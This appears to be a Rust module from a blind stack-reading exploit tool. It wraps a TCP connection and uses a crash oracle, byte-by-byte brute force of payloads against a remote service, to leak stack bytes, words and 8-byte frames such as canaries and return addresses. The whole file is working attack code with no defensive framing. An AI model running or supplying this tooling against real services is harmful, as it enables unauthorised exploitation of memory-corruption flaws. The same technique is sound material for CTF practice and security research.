use std::cmp;
use std::io;
use std::io::ErrorKind::WouldBlock;
use std::io::{BufRead, Read, Write};
use std::net::{Shutdown, TcpStream, ToSocketAddrs};
use std::time::Duration;

use crate::{
    cluster::{Byte, Frame, Word, WordLike, OVERFLOW_BUFFER_SIZE},
    payload::Payload,
    response::{Response, ReturnCode, ReturnVal},
};

#[derive(PartialEq, Debug, Clone)]
pub enum Status {
    Open,
    Close,
}

#[derive(Debug)]
pub struct Tube {
    pub status: Status,
    inner: TcpStream,
    buf: Box<[u8]>,
    pos: usize,
    cap: usize,
}

impl Tube {
    pub fn new(addr: impl ToSocketAddrs) -> io::Result<Tube> {
        let stream = TcpStream::connect(addr)?;
        stream.set_read_timeout(Some(Duration::new(1, 0)))?;
        let buffer = {
            let capacity = 0x2000usize;
            let mut buf = Vec::with_capacity(capacity);
            unsafe {
                buf.set_len(capacity);
            }
            buf
        };

        Ok(Tube {
            status: Status::Open,
            inner: stream,
            buf: buffer.into_boxed_slice(),
            pos: 0,
            cap: 0,
        })
    }

    pub fn restart(&mut self) -> io::Result<()> {
        let addr = self.inner.peer_addr()?;
        self.inner.shutdown(Shutdown::Both)?;

        let stream = TcpStream::connect(addr)?;
        stream.set_read_timeout(Some(Duration::from_millis(1)))?;
        self.inner = stream;
        self.status = Status::Open;
        Ok(())
    }

    #[allow(dead_code)]
    pub fn close(mut self) -> io::Result<()> {
        self.status = Status::Close;
        self.inner.shutdown(Shutdown::Both)
    }

    pub fn probe(&mut self, payload: &Payload) -> Option<ReturnCode> {
        if self.restart().is_err() {
            return None;
        }
        if self.write_all(&payload.to_vec()).is_err() {
            return None;
        }
        match self.read(&mut [0; OVERFLOW_BUFFER_SIZE]) {
            Ok(0) => Some(ReturnCode::Crash),
            Ok(_) => Some(ReturnCode::NoCrash),
            Err(e) if e.kind() == WouldBlock => Some(ReturnCode::Infinite),
            _ => None,
        }
    }

    pub fn stack_read_byte(&mut self, payload: &Payload) -> Result<Byte, Option<Response>> {
        self.stack_read_byte_start_from(0x00u8, payload)
    }

    pub fn stack_read_byte_start_from(
        &mut self,
        start: u8,
        payload: &Payload,
    ) -> Result<Byte, Option<Response>> {
        let mut byte = start;
        let mut payload = payload.to_owned();
        loop {
            payload.push(byte);

            match self.probe(&payload) {
                Some(ReturnCode::NoCrash) => return Ok(byte),
                Some(ReturnCode::Crash) => {
                    payload.pop();
                    byte += 1;
                }
                Some(ReturnCode::Infinite) => {
                    return Err(Some(Response {
                        code: ReturnCode::Infinite,
                        value: ReturnVal::Byte(byte),
                    }));
                }
                _ => return Err(None),
            }
        }
    }

    pub fn stack_read_word(
        &mut self,
        payload: &Payload,
        len: usize,
    ) -> Result<Word, Option<Response>> {
        let mut word = Vec::with_capacity(len);
        let mut payload = payload.to_owned();
        let mut infinite_flag = false;

        for _ in 1..=len {
            let byte = match self.stack_read_byte(&payload) {
                Ok(byte) => byte,
                Err(Some(Response {
                    code: ReturnCode::Infinite,
                    value: ReturnVal::Byte(byte),
                })) => {
                    infinite_flag = true;
                    byte
                }
                _ => return Err(None),
            };
            word.push(byte);
            payload.push(byte);
        }

        if infinite_flag {
            Err(Some(Response {
                code: ReturnCode::Infinite,
                value: ReturnVal::Word(Word(word)),
            }))
        } else {
            Ok(Word(word))
        }
    }

    pub fn stack_read_frame(&mut self, payload: &Payload) -> Result<Frame, Option<Response>> {
        match self.stack_read_word(payload, 8) {
            Ok(word) => Ok(Frame::from_vec(word.to_vec())),
            Err(Some(Response {
                code: ReturnCode::Infinite,
                value: ReturnVal::Word(word),
            })) => Err(Some(Response {
                code: ReturnCode::Infinite,
                value: ReturnVal::Word(word),
            })),
            _ => Err(None),
        }
    }

    pub fn discard_buffer(&mut self) {
        self.pos = 0;
        self.cap = 0;
    }
}

impl Read for Tube {
    fn read(&mut self, buf: &mut [u8]) -> io::Result<usize> {
        if self.pos == self.cap && buf.len() >= self.buf.len() {
            self.discard_buffer();
            let read_wrapper = self.inner.read(buf);
            if read_wrapper.is_err() {
                self.status = Status::Close;
            }
            return read_wrapper;
        }
        let nread = {
            let mut rem = self.fill_buf()?;
            rem.read(buf)?
        };
        self.consume(nread);
        Ok(nread)
    }
}

impl BufRead for Tube {
    fn fill_buf(&mut self) -> io::Result<&[u8]> {
        if self.pos >= self.cap {
            self.cap = self.inner.read(&mut self.buf)?;
            self.pos = 0;
        }
        Ok(&self.buf[self.pos..self.cap])
    }

    fn consume(&mut self, amt: usize) {
        self.pos = cmp::min(self.pos + amt, self.cap);
    }
}

impl Write for Tube {
    fn write(&mut self, buf: &[u8]) -> io::Result<usize> {
        let write_wrapper = self.inner.write(buf);
        if write_wrapper.is_err() {
            self.status = Status::Close
        }
        write_wrapper
    }

    fn flush(&mut self) -> io::Result<()> {
        self.inner.flush()
    }
}
